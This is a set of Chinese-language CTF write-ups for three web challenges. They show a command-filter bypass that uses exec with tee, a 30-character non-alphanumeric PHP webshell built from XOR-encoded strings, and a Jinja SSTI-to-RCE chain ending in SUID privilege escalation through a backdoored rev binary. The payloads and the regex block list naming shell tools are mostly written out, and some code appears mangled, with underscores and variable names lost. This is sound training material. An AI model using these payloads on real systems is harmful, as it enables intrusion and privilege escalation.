[[SWPUCTF 2021 新生赛]finalrce]

    highlight_file(__FILE__);
    
    if(isset($_GET['url']))
    
    {
    
        url=_GET['url'];
    
        if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|\"|>|<|\%|$/i',$url))
    
        {
    
            echo "Sorry,you can't use this.";
    
        }
    
        else
    
        {
    
            echo "Can you see anything?";
    
            exec($url);
    
        }
    
    } ```
    
    
    
    
    

在exec（）函数中，若有output参数，那么会用命令执行的输出填充数组。如果同时提供output和result_code参数，命令执行后返回状态会被写入到result_code。

所以传入命令是没有回显的。



构造：command | tee file.txt

绕过ls：/?url=l/s|tee 1.txt

访问：/1.txt

    a_here_is_a_f1ag
    bin
    boot
    dev
    etc
    flllllaaaaaaggggggg
    home
    lib
    lib64
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var

注意到flag

http://node7.anna.nssctf.cn:27265/?url=tac%20/flllll\aaaaaaggggggg%20|tee%202.txt)

注意la之间需要绕过

在访问/2.txt 获得flag





MoeCTF 2025 这是...Webshell？

    <?php
    highlight_file(__FILE__);
    
    if (isset($_GET['shell'])) {
        $shell = $_GET['shell'];
        if (strlen($shell) > 30) {
            die("error: shell length exceeded");
        }
        if (preg_match("/[A-Za-z0-9_$]/", $shell)) {
            die("error: shell not allowed");
        }
        eval($shell);
    }

分析过滤条件：长度<=30字符

不能包含任何字母（A-Z a-z）、数字、下划线、$。

assert($POST[''])

%01^``=a

%13^``=s

%13^``=s

%05^``=e

%14^``=t

$_=('%01^`').('%13'^'').('%13'^'').('%05'^'').('%12'^'').('%14'^'');

%0D^]=P

%2F^=O

%0E^]=S

%09^]=T

    $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');

变量变量：

php

    $___=$$__;

$$__ 表示变量变量：$_POST（超全局数组）

所以 $___ = $_POST

执行代码

php

    $_($___[_]);

http://127.0.0.1:57195/?shell=_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); =''.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); $=$$__;$_($__[]);









MoeCTF 2025 第二十二章 血海核心·千年手段

    @app.route('/')
    def index():
        if 'username' in request.args:
            username = request.args.get('username', '')
            # ... 
            login_msg = f"Welcome: {username}"
            render_template_string(login_msg)  # 直接渲染了包含用户输入的字符串，导致 SSTI。



?username={{ url_for.globals.builtins.import('os').makedirs('static', exist_ok=True) or url_for.globals.builtins.import('builtins').open('static/dir.txt','w').write( url_for.globals.builtins.import('os').popen('dir ../').read() ) }}&password=1

1. 访问结果：
   text
       http://127.0.0.1:50094/static/dir.txt
   
   
   输出：
   text
       app  boot  entrypoint.sh  flag  lib    media  opt   root  sbin  sys  usr
       bin  dev   etc      home  lib64  mnt    proc  run   srv   tmp  var
   
   
   发现 flag 文件在上级目录：../flag

第三步：尝试直接读取 flag

text

    ?username={{ ... .write( ... .popen('cat ../flag').read() ) }}&password=1

访问：

text

    http://127.0.0.1:50094/static/flag.txt

结果：无法读取（权限问题）

第四步：寻找 SUID 提权机会

- Set User ID：程序运行时以文件所有者的权限执行

寻找 SUID 程序

text

    popen('find / -perm -4000 -type f 2>/dev/null').read()

输出：

text

    /usr/bin/rev      # 可疑的程序！
    /usr/bin/mount
    /usr/bin/passwd
    /usr/bin/su
    ...

关键发现：/usr/bin/rev 有 SUID 权限，通常 rev（反转文本）不应该需要特殊权限

5.逆向分析 /usr/bin/rev

反汇编 main 函数

bash

    objdump -d /usr/bin/rev | grep -A 30 main

关键代码分析：

assembly

    1175: mov    (%rax),%rax          # 加载第一个参数到 %rax
    1178: mov    %rax,%rsi            # 移动到 %rsi（strcmp 第二参数）
    
    117b: lea    0xe82(%rip),%rax     # 加载 0x2004 地址的字符串
    1182: mov    %rax,%rdi            # 移动到 %rdi（strcmp 第一参数）
    
    1185: call   1030 <strcmp@plt>    # 比较字符串
    118a: test   %eax,%eax            # 检查结果
    118c: jne    11cc <main+0x83>     # 不相等则跳过
    
    # 如果相等...
    11be: mov    (%rax),%rax          # 加载第二个参数
    11c1: mov    %rdx,%rsi            # 第三个参数
    11c4: mov    %rax,%rdi            # 第二个参数（命令）
    11c7: call   1040 <execvp@plt>    # 执行命令！

1. 程序不是真正的 rev
2. 密码比较：比较第一个参数是否等于 --HDdss
3. 命令执行：如果密码正确，执行第二、第三个参数
   - 格式：/usr/bin/rev [密码] [命令] [命令参数]

6.利用 SUID rev 提权读取 flag

payload：

text

    /usr/bin/rev --HDdss /bin/cat /flag

执行：

text

    ?username={{ ... .write( ... .popen('/usr/bin/rev --HDdss /bin/cat /flag').read() ) }}&password=1

访问：

text

    /static/final_flag.txt

成功获取 flag：

text
moectf{705428ee-8db9-18ee-8ae3-fec60584cdcf}
